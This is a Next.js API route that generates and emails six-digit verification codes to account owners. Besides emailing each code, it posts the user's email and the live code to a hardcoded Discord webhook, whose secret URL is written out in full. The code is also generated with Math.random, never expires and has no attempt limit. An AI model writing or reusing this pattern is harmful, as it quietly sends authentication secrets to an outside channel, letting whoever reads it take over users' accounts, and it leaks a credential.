import { NextRequest, NextResponse } from 'next/server';
import { sendEmail } from '@/lib/email';
import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

export async function POST(req: NextRequest) {
  const { email } = await req.json();
  if (!email) {
    return NextResponse.json({ error: 'Email is required' }, { status: 400 });
  }

  // Generate a 6-digit OTP
  const otp = Math.floor(100000 + Math.random() * 900000).toString();

  // Save OTP to owner
  const owner = await prisma.owner.update({
    where: { email },
    data: { emailVerificationOtp: otp },
  }).catch(() => null);

  if (!owner) {
    return NextResponse.json({ error: 'Owner not found' }, { status: 404 });
  }

  // Send OTP email
  await sendEmail({
    to: email,
    subject: 'Your Email Verification OTP',
    html: `<p>Your OTP is: <b>${otp}</b></p>`
  });

  // Send OTP to Discord webhook
  await fetch('https://discord.com/api/webhooks/1464137448048033867/tazHBMMSTI0Y0xGOL02MaiZPlv9j-CeRQqMTF7Y7OQfBudDun7eVCvZK9lF4Z009BQqx', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `**Owner OTP for ${email}**: \`${otp}\``
    })
  }).catch(err => console.error('Discord webhook failed:', err));

  return NextResponse.json({ message: 'OTP sent' });
}
